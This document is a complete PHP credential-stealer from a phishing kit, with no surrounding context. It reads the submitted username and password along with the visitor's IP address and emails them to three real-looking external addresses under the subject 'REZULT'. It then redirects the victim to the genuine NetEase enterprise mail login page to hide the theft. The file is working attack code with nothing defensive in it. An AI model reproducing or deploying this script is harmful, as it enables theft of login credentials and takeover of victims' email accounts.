<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ Heibest +--------------\n";
$message .= "Username : ".$_POST['account_name']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ShellsHost-----------------\n";
$send = "dora198372@126.com,logslogs.logs@yandex.com,eddy782.82@gmail.com";
$subject = "Heibest REZULT [ $ip ]";
$headers = "From: Heibest<Heibest@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>
<script>
    window.top.location.href = "https://entry.qiye.163.com/domain/login/entry.jsp";

</script>

